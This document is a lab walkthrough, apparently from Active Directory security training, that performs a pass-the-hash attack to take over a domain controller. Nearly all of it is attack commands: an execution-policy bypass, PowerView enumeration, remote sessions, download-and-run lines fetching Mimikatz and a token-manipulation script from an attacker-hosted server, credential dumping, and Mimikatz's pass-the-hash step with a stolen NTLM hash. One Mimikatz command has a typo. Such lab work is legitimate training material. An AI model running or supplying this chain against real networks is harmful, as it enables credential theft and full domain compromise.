
### Pass the Hash Attack

It is an attack where the hash of the password can be used for authentication of that user without needing cracking of the actual plain text password. 


- Once the hash is obtained, the attacker can pass the hashed credential to other systems within the active directory domain. 


### Tasks
- Perform Pass-The-Hash attack to access the domain controller. 


##### Load PowerView

```powershell
powershell -ep bypass

. .\PowerView.ps1
```



### Enumeration

##### Get the current domain:

```powershell
Get-Domain
```

It will tell us the current domain and the domain controller. 

Domain: `research.Security.local`
DC: `prod.research.security.local`
Forest: `Security.local`


##### Find the machine in current domain where current user has `Local Administrator` access. 

```powershell
Find-LocalAdminAccess
```

It will list all the machines where the current user has local administrator access. 
##### Powershell Remoting:

We will perform powershell remoting to access found machine above. 

```powershell
Enter-PSSession seclogs.research.security.local
```

It will give us the access of that system. 


Run the hfs server from the first machine and host `Invoke-Mimikatz.ps1` and `Invoke-TokenManipulations.ps1`.


In the Powershell remoted machine, run the following commands:
```powershell
cd /

iex (New-Object Net.WebClient).DownloadString('http://10.10.10.10/Invoke-Mimikatz.ps1')

iex (New-Object Net.WebClient).DownloadString('http://10.10.10.10/Invoke-TokenManipulations.ps1')
```

##### Enumeration
```powershell
Invoke-TokenManipulation -Enumerate
```


##### Dumping Passwords:
```powershell
Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "sekurlsa:logonpasswords"'
```

We will get the NTLM hash of the administrator with this command. 


We will pass this found hash too perform pass the hash attack:

We again need to open powershell as an administrator on the first student machine. 
We have to invoke the mimikatz here:
```powershell
. .\Invoke-Mimikatz.ps1
```

```powershell
Invoke-Mimikatz -Command '"sekurlsa::pth /user:administrator /domain:research.security.local /ntlm:HASH /run:powershell.exe"'
```

It will open another powershell process where we will be an administrator on the research.security.local machine. 


We can run the following powershell-Remoting command on the new powershell to get access of the DC. 

```powershell
Enter-PSSession prod.research.SECURITY.local
```


We are on the DC now. 

```powershell
hostname
```

It is DC. 


### Conclusion:

First, we found another machine where we were having local admin access. We did PS remoting into that system. 
We run mimikatz there to dump all the credentials there.  We found that the domain admin, or the administrator user of the DC was logged in there. So used the hash to perform pass the hash attack on the target machine, from there we did ps remoting to get an administrator on the DC. 

